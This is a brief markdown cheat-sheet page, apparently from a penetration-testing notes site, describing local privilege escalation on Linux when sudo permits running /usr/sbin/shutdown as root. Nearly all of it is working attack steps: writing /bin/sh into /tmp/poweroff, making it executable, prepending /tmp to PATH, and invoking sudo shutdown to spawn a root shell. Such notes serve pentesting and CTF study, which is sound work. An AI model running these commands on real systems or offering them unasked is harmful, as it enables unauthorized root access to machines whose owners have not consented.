---
title: Sudo Shutdown, Poweroff Privilege Escalation
description: Sudo shutdown command might be vulnerable to privilege escalation (PrivEsc).
tags:
    - Privilege Escalation
refs:
date: 2023-02-05
draft: false
---

## Investigation

```sh
sudo -l

(ALL) NOPASS: /usr/sbin/shutdown
```

If we can execute **"shutdown"** command as root, we can gain access to privileges by overwriting the path of **"poweroff"**.

<br />

## Exploitation

First create **/tmp/poweroff** binary which invoke a shell.

```sh
echo /bin/sh > /tmp/poweroff
# or
echo /bin/bash > /tmp/poweroff
```

Then change permissions of the file and add **"/tmp"** folder to **PATH**.

```sh
chmod +x /tmp/poweroff
export PATH=/tmp:$PATH
```

Now execute **"shutdown"** as root.

```sh
# Some SUID command
sudo /usr/sbin/shutdown

# Then you are root user
root>
```

**/tmp/poweroff** is executed and spawn a root shell.

